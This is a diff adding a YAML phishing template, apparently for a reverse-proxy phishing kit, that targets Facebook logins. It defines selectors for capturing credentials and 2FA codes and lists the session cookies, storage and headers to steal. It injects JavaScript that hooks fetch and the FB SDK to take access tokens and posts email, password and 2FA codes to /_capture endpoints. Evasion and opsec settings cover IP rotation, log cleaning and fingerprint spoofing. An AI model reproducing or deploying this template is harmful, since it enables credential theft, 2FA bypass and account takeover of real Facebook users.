@@ -1,0 +1,142 @@
+name: "Facebook Advanced"
+description: "Advanced Facebook phishing template with session cloning and 2FA bypass"
+author: "Vantablack Team"
+version: "2.0"
+
+base_domain: "facebook.com"
+target_url: "https://www.facebook.com/login.php"
+
+credentials:
+  username_selector: "input[name='email']"
+  password_selector: "input[name='pass']"
+  submit_selector: "button[name='login']"
+
+mfa:
+  enabled: true
+  sms_code_pattern: '(\d{5})'
+  email_code_pattern: '(Your Facebook code is |Code: )(\d{5})'
+  app_code_selector: "input[name='approvals_code']"
+
+session_capture:
+  cookies: true
+  local_storage: true
+  session_storage: true
+  headers:
+    - "Authorization"
+    - "X-FB-Friendly-Name"
+    - "User-Agent"
+
+injection_points:
+  - selector: "body"
+    position: "beforeend"
+    script: |
+      <script>
+        // Facebook session hijacking with advanced techniques
+        (function() {
+          // Intercept Graph API requests
+          const originalFetch = window.fetch;
+          window.fetch = function(...args) {
+            return originalFetch.apply(this, args).then(response => {
+              if (args[0] && args[0].includes('graph.facebook.com')) {
+                response.clone().json().then(data => {
+                  if (data.access_token || data.authResponse) {
+                    fetch('/_capture/fb_tokens', {
+                      method: 'POST',
+                      headers: {'Content-Type': 'application/json'},
+                      body: JSON.stringify({
+                        token: data.access_token || data.authResponse,
+                        timestamp: new Date().toISOString(),
+                        user_agent: navigator.userAgent
+                      })
+                    });
+                  }
+                });
+              }
+              return response;
+            });
+          };
+
+          // Capture login events with detailed analytics
+          const forms = document.querySelectorAll('form');
+          forms.forEach(form => {
+            const observer = new MutationObserver(function(mutations) {
+              mutations.forEach(mutation => {
+                if (mutation.type === 'attributes' && 
+                    mutation.attributeName === 'action' && 
+                    form.action.includes('/login/')) {
+                  
+                  const formData = new FormData(form);
+                  const credentials = {
+                    email: formData.get('email'),
+                    pass: formData.get('pass'),
+                    lsd: formData.get('lsd'),
+                    jazoest: formData.get('jazoest')
+                  };
+                  
+                  fetch('/_capture/fb_credentials', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(credentials)
+                  });
+                }
+              });
+            });
+            
+            observer.observe(form, { attributes: true });
+          });
+
+          // Monitor for 2FA challenges
+          setInterval(() => {
+            const codeInputs = document.querySelectorAll('input[name="approvals_code"]');
+            if (codeInputs.length > 0) {
+              codeInputs.forEach(input => {
+                input.addEventListener('input', function(e) {
+                  if (e.target.value.length === 5) {
+                    fetch('/_capture/fb_2fa', {
+                      method: 'POST',
+                      headers: {'Content-Type': 'application/json'},
+                      body: JSON.stringify({ code: e.target.value })
+                    });
+                  }
+                });
+              });
+            }
+          }, 1000);
+
+          // Intercept FB JavaScript SDK
+          Object.defineProperty(window, 'FB', {
+            set: function(newFB) {
+              if (newFB && newFB.getAuthResponse) {
+                const originalGetAuthResponse = newFB.getAuthResponse;
+                newFB.getAuthResponse = function() {
+                  const response = originalGetAuthResponse.apply(this, arguments);
+                  if (response && response.accessToken) {
+                    fetch('/_capture/fb_auth', {
+                      method: 'POST',
+                      headers: {'Content-Type': 'application/json'},
+                      body: JSON.stringify(response)
+                    });
+                  }
+                  return response;
+                };
+              }
+              return newFB;
+            },
+            configurable: true
+          });
+
+        })();
+      </script>
+
+evasion:
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+  referrer_policy: "origin-when-cross-origin"
+  ip_rotation: true
+  request_delay: 800
+
+opsec:
+  log_cleaning: true
+  memory_only_storage: true
+  encrypted_logs: true
+  browser_fingerprint_spoofing: true
+  canvas_fingerprint_protection: true
